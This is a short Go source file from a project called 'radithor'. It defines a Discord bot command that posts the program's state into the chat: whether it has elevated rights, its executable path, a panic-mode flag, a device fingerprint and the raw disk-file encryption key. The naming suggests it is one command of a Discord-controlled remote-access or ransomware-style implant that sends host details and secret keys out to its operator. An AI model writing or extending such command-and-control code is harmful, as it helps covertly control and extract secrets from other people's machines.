package commands_internal

import (
	"fmt"
	"strings"

	"radithor/bot/discord"
	"radithor/store"
)

func getState(ctx *discord.CommandContext, args []string) {
	var response strings.Builder

	response.WriteString("```\n")

	fmt.Fprintf(&response, "IsElevated: %t\n", store.IsElevated)
	fmt.Fprintf(&response, "ExecPath: %s\n", store.ExecPath)
	fmt.Fprintf(&response, "ExecDir: %s\n", store.ExecDir)
	fmt.Fprintf(&response, "InPanicMode: %t\n", store.InPanicMode)
	fmt.Fprintf(&response, "DiskFileDataEncryptionKeySet: %t\n", store.DiskFileDataEncryptionKeySet)

	fmt.Fprintf(&response, "DeviceFingerprint: %x\n", store.DeviceFingerprint)
	fmt.Fprintf(&response, "DiskFileDataEncryptionKey: %x\n", store.DiskFileDataEncryptionKey)

	response.WriteString("```")

	ctx.ReplyMsg(response.String())
}
